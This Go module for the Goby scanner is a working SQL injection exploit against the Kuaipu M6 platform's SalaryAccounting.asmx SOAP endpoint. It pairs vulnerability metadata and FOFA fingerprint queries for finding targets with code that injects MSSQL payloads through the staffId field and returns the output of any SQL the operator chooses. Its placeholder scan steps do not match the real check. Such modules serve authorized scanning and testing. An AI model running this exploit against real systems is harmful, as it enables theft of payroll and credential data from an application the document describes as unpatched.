package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kuaipu integrated management platform /WebService/HR/Salary/SalaryAccounting.asmx SQL injection vulnerability",
    "Description": "<p>Kuaipu Software is a comprehensive enterprise management software that covers financial management, human resources management, supply chain management, production and manufacturing and other aspects. The software is known for its powerful functions and flexibility, and can meet the personalized needs of different enterprises.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.</p>",
    "Product": "Kuaipu-M6",
    "Homepage": "http://www.kuaipu.com.cn/",
    "DisclosureDate": "2023-08-15",
    "PostTime": "2024-03-20",
    "Author": "2737977997@qq.com",
    "FofaQuery": "(body=\"/Resource/LoginLogo\" || body=\"Resource/CSS/Themes/templet/\" || body=\"src=\\\"Resource/JavaScript\") && (body=\"OnObjectReady(objObject,objAsyncContext)\" || body=\"typeof(ValidatorOnSubmit) == \\\"function\\\" && ValidatorOnSubmit() == false\" || body=\"height: 94%; /* >94%ie部分机器有滚动条*/\")",
    "GobyQuery": "(body=\"/Resource/LoginLogo\" || body=\"Resource/CSS/Themes/templet/\" || body=\"src=\\\"Resource/JavaScript\") && (body=\"OnObjectReady(objObject,objAsyncContext)\" || body=\"typeof(ValidatorOnSubmit) == \\\"function\\\" && ValidatorOnSubmit() == false\" || body=\"height: 94%; /* >94%ie部分机器有滚动条*/\")",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.</p>",
    "Recommendation": "<p>1. The official has not fixed this vulnerability yet. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.kuaipu.com.cn/\">http://www.kuaipu.com.cn/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select @@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2023"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "快普整合管理平台 /WebService/HR/Salary/SalaryAccounting.asmx SQL 注入漏洞",
            "Product": "快普-M6",
            "Description": "<p>快普软件是一款综合性的企业管理软件，它涵盖了财务管理、人力资源管理、供应链管理、生产制造等多个方面。该软件以强大的功能和灵活性著称，能够满足不同企业的个性化需求。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.kuaipu.com.cn/\">http://www.kuaipu.com.cn/</a><a href=\"http://www.kuaipu.com/\"></a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Kuaipu integrated management platform /WebService/HR/Salary/SalaryAccounting.asmx SQL injection vulnerability",
            "Product": "Kuaipu-M6",
            "Description": "<p>Kuaipu Software is a comprehensive enterprise management software that covers financial management, human resources management, supply chain management, production and manufacturing and other aspects. The software is known for its powerful functions and flexibility, and can meet the personalized needs of different enterprises.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.</p>",
            "Recommendation": "<p>1. The official has not fixed this vulnerability yet. Please contact the manufacturer to fix the vulnerability:&nbsp;<a href=\"http://www.kuaipu.com.cn/\">http://www.kuaipu.com.cn/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10967"
}`
	injectionRequestBNDAYU32190 := func(hostinfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		injectionRequestConfig := httpclient.NewPostRequestConfig("/WebService/HR/Salary/SalaryAccounting.asmx")
		injectionRequestConfig.VerifyTls = false
		injectionRequestConfig.FollowRedirect = false
		injectionRequestConfig.Header.Store("Content-Type", "text/xml; charset=utf-8")
		injectionRequestConfig.Data = `<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Calculate xmlns="http://tempuri.org/">
      <SalaryCategory></SalaryCategory>
      <StaffBirthDay></StaffBirthDay>
       <staffId>1) AND 2760 IN (` + sql + `) AND (1301=1301</staffId>
      <Department></Department>
      <SubOrg></SubOrg>
      <taxMonthly></taxMonthly>
    </Calculate>
  </soap:Body>
</soap:Envelope>`
		return httpclient.DoHttpRequest(hostinfo, injectionRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := injectionRequestBNDAYU32190(hostinfo, "SELECT (CHAR(113)+CHAR(98)+CHAR(113)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (2760=2760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(118)+CHAR(113))")
			if err == nil && strings.Contains(resp.Utf8Html, `qbqjq1qpzvq`) {
				stepLogs.VulURL = hostinfo.HostInfo + "/WebService/HR/Salary/SalaryAccounting.asmx"
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "sql" {
				resp, err := injectionRequestBNDAYU32190(expResult.HostInfo, goutils.B2S(stepLogs.Params["sql"]))
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(resp.Utf8Html, `varchar`) {
					match := regexp.MustCompile(`'([^']+)'`).FindStringSubmatch(resp.Utf8Html)
					if len(match) > 1 {
						expResult.Success = true
						expResult.Output = match[1]
					} else {
						expResult.Output = "执行失败！"
					}
				} else {
					expResult.Output = "执行失败！"
				}
			} else if attackType == "sqlPoint" {
				resp, err := injectionRequestBNDAYU32190(expResult.HostInfo, "SELECT (CHAR(113)+CHAR(98)+CHAR(113)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (2760=2760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(118)+CHAR(113))")
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(resp.Utf8Html, `qbqjq1qpzvq`) {
					expResult.Output = `POST /WebService/HR/Salary/SalaryAccounting.asmx HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 724
Content-Type: text/xml; charset=utf-8
Accept-Encoding: gzip, deflate
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Calculate xmlns="http://tempuri.org/">
      <SalaryCategory></SalaryCategory>
      <StaffBirthDay></StaffBirthDay>
       <staffId>1) AND 2760 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(113)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (2760=2760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(118)+CHAR(113))) AND (1301=1301</staffId>
      <Department></Department>
      <SubOrg></SubOrg>
      <taxMonthly></taxMonthly>
    </Calculate>
  </soap:Body>
</soap:Envelope>`
					expResult.Success = true
				} else {
					expResult.Output = "漏洞利用失败！"
				}
			}
			return expResult
		},
	))
}
